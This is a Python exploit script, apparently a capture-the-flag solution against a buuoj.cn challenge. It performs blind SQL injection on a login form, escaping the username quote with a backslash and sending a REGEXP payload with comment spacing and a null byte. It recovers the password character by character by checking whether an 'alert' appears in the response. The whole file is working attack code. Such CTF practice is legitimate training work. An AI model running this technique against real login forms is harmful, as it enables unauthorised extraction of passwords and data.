import requests
import string
import time

url = 'http://8fa8b146-080e-4d37-b52a-abb79ffd8745.node5.buuoj.cn:81/'
flag = ''
len = flag.__len__()

# regexp 注入的字典：小写字母，数字，在 C 区域设置中被视为标点符号的 ASCII 字符
# 要用第二个字典，第一个字典中会包含通配符，导致匹配一大堆乱七八糟的字母，得不到结果
# fuzz_dict = string.ascii_lowercase + string.digits + string.punctuation

fuzz_dict = string.ascii_lowercase + string.digits + '_'


while True:
    sign = len
    for i in fuzz_dict:
        temp = flag
        temp += i
        # payload
        payload = f'||/**/passwd/**/regexp/**/"^{temp}";\x00'

        # post请求参数
        data = {
            'username':'\\',
            'passwd':payload
        }

        res = requests.post(url=url, data=data).text
        # time.sleep(0.1)
        
        # 经过测试，当猜错时，会有一个弹窗alert，猜对时便没有
        if "alert" not in res:
            flag += i
            # 记录flag的长度，用于判断是否可以退出循环
            len = flag.__len__()
            print(flag)
            break
    # 当flag长度不再变化时，可以判断flag已猜完。
    if sign == len:
        break
print(flag)
